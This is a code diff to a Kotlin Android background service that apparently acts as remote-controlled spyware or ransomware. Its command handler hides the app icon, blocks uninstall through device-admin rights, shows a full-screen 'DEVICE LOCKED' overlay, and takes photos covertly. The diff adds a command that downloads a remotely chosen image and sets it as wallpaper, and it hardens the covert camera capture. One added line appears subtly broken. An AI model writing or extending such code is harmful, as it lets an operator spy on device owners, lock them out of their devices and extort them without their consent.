@@ -1,6 +1,7 @@
 package com.example.malzguard
 
 import android.app.*
+import android.app.WallpaperManager
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -155,14 +156,19 @@ class Svc : Service() {
                     if (!dpm.isAdminActive(admin)) "ERR: not admin" else { dpm.lockNow(); "locked" }
                 }
                 "custom_lock" -> {
-                    val html = a.optString("html", LockOverlay.DEFAULT_HTML)
-                    val i = Intent(this, LockOverlay::class.java)
-                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                    i.putExtra("html", html)
-                    startActivity(i)
-                    "custom lock shown"
+                    if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
+                        Handler(Looper.getMainLooper()).post {
+                            try { startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (e: Exception) {}
+                        }
+                        "ERR: no overlay permission"
+                    } else {
+                        val html = a.optString("html", "<h1>DEVICE LOCKED</h1>")
+                        LockManager.show(this, html)
+                        "custom lock shown"
+                    }
                 }
                 "unlock" -> {
+                    try { LockManager.hide(this) } catch (e: Exception) {}
                     try {
                         val i = Intent(LockOverlay.ACTION_UNLOCK)
                         i.setPackage(packageName)
@@ -199,10 +205,42 @@ class Svc : Service() {
                 "show_icon" -> { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP); "shown" }
                 "uninstall_block" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, true); "blocked" } else "ERR: not admin" }
                 "uninstall_unblock" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, false); "unblocked" } else "ERR: not admin" }
+                "set_wallpaper" -> { setWallpaper(a.optString("url", "")); "wallpaper requested" }
                 "take_photo" -> { takePhoto(a.optString("facing", "back")); "photo requested" }
                 else -> "unknown"
             }
         } catch (e: Exception) { "ERR: " + (e.message ?: "?") }
+    }
+
+    private fun setWallpaper(url: String) {
+        Thread {
+            try {
+                if (url.isEmpty()) { logSrv("wp_err", "url_empty"); return@Thread }
+                logSrv("wp_start", "url=" + url.take(80))
+                val conn = URL(url).openConnection() as HttpURLConnection
+                conn.connectTimeout = 15000; conn.readTimeout = 30000
+                conn.instanceFollowRedirects = true
+                conn.connect()
+                val bytes = conn.inputStream.use { it.readBytes() }
+                conn.disconnect()
+                if (bytes.isEmpty()) { logSrv("wp_err", "empty_bytes"); return@Thread }
+                logSrv("wp_dl", "size=" + bytes.size)
+                val bmp = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+                if (bmp == null) { logSrv("wp_err", "decode_fail"); return@Thread }
+                val wmgr = WallpaperManager.getInstance(applicationContext)
+                try { wmgr.setBitmap(bmp) } catch (e: Exception) {
+                    try { wmgr.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM) } catch (e2: Exception) {
+                        try { wmgr.setBitmap(bmp, null, true, WallpaperManager.FLAG_LOCK) } catch (e3: Exception) {
+                            logSrv("wp_err", "set_fail: " + (e3.message ?: "?"))
+                            return@Thread
+                        }
+                    }
+                }
+                logSrv("wp_ok", "wallpaper set")
+            } catch (e: Exception) {
+                logSrv("wp_err", e.message ?: "unknown")
+            }
+        }.start()
     }
 
     private fun takePhoto(facing: String) {
@@ -215,7 +253,12 @@ class Svc : Service() {
                 return
             }
             showOverlay()
-            camHandler?.postDelayed({ capturePhoto(facing) }, 300)
+            val h = camHandler ?: Handler(Looper.getMainLooper())
+            logSrv("cam_step", "posting capture, handler=" + (if (camHandler != null) "cam" else "main"))
+            h.postDelayed({
+                logSrv("cam_step", "running capture")
+                try { capturePhoto(facing) } catch (e: Exception) { logSrv("cam_err", "cp: " + (e.message ?: "?")) }
+            }, 500)
         } catch (e: Exception) { logSrv("cam_err", "take: " + (e.message ?: "?")); hideOverlay() }
     }
 
@@ -240,7 +283,9 @@ class Svc : Service() {
     }
 
     private fun capturePhoto(facing: String) {
+        val h = h ?: Handler(Looper.getMainLooper())
         try {
+            logSrv("cam_step", "enter capturePhoto facing=" + facing)
             val cm = getSystemService(CAMERA_SERVICE) as CameraManager
             val camId = cm.cameraIdList.firstOrNull { cid ->
                 val ch = cm.getCameraCharacteristics(cid)
@@ -264,7 +309,7 @@ class Svc : Service() {
                 } catch (e: Exception) { logSrv("cam_err", "snap: " + (e.message ?: "?")) }
                 try { r.close() } catch (e: Exception) {}
                 hideOverlay()
-            }, camHandler)
+            }, h)
             cm.openCamera(camId, object : CameraDevice.StateCallback() {
                 override fun onOpened(cam: CameraDevice) {
                     logSrv("cam_opened", "ok")
@@ -274,17 +319,17 @@ class Svc : Service() {
                                 try {
                                     val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                     req.addTarget(reader.surface)
-                                    sess.capture(req.build(), null, camHandler)
-                                    camHandler?.postDelayed({ try { cam.close() } catch (e: Exception) {} }, 3000)
+                                    sess.capture(req.build(), null, h)
+                                    h?.postDelayed({ try { cam.close() } catch (e: Exception) {} }, 3000)
                                 } catch (e: Exception) { logSrv("cam_err", "capture: " + (e.message ?: "?")); hideOverlay() }
                             }
                             override fun onConfigureFailed(sess: CameraCaptureSession) { logSrv("cam_err", "config_fail"); hideOverlay() }
-                        }, camHandler)
+                        }, h)
                     } catch (e: Exception) { logSrv("cam_err", "session: " + (e.message ?: "?")); hideOverlay() }
                 }
                 override fun onDisconnected(cam: CameraDevice) { try { cam.close() } catch (e: Exception) {}; logSrv("cam_err", "disc"); hideOverlay() }
                 override fun onError(cam: CameraDevice, e: Int) { try { cam.close() } catch (e: Exception) {}; logSrv("cam_err", "onerr=$e"); hideOverlay() }
-            }, camHandler)
+            }, h)
         } catch (e: Exception) { logSrv("cam_err", "cap: " + (e.message ?: "?")); hideOverlay() }
     }
 
